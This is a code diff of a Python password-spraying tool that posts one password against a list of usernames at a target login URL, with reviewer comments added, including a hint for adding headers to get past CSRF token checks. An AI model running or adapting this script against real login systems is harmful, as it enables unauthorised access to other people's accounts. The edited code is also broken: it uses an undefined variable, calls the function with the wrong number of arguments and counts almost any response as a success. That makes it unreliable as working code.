@@ -1,10 +1,7 @@
 import requests
 
-targeturl = input("Enter Target Url: ")
-targetpass = input("Enter Target Password: ")
-error = input("Enter Wrong User Error Message: ")
-
-def passwordSpray(targetpass,targeturl,error):
+#Code reviewed, time to hustle.
+def passwordSpray(password: str, url: str) -> bool:
     print("""
      _____ _               _____                       _  ______            _        __                   
     /  __ | |             |  ___|                     | | | ___ \          | |      / _|                  
@@ -14,20 +11,25 @@ def passwordSpray(targetpass,targeturl,error):
      \____|_|\__,_|___|___\____|_|  \__,_|___/\___|\__,_| \____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|\n\n""")
     
     for username in usernames:
-        username = username.strip()
+        username = username.strip() # redundant, bad data (also doesn't account for spaces in between) alternatively: username = username.replace(" ", "")
         print(f"Trying:", {username})
-        data_dict = {"username": username,"password": targetpass,"login":"submit"}
-        response = requests.post(targeturl, data=data_dict)
-        if error in str(response.content):
+        data = {"username": username,"password": password,"login":"submit"} # login value will only work for very few back-end oriented auth systems
+        response = requests.post(url, data=data)
+        if not r.ok: # error does nothing here, response.text returns string value, would recommend using r.ok to evaluate if not 200 status code
             pass
-        elif "csrf" in str(response.content):
-            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
-            exit(0)
+        if "csrf" in str(response.content):
+            print("CSRF token detected") # you can add headers like: response = requests.post(url, data=data, headers=headers) and create a headers dict for the CSRF token
+            return False
         else:
-            print(f"Username: ---> ", {username}, "\n", "Password: ---> ", {targetpass})
-            exit(0)
+            print(f"Success: Username: ---> ", {username}, "\n", "Password: ---> ", {password})
+            return True
+
 
 if __name__ == '__main__':
+    url = input("Enter Target Url: ")
+    password = input("Enter Target Password: ")
+    error = input("Enter Wrong User Error Message: ")
+    
     try:
         passwordSpray()
     except:
@@ -35,6 +37,6 @@ if __name__ == '__main__':
 
     #compile list from engagement notes
     with open("usernames.txt", "r") as usernames:
-        passwordSpray(targetpass,targeturl,error)
+        passwordSpray(password,url,error)
     
     print("[!!] Username not in list")
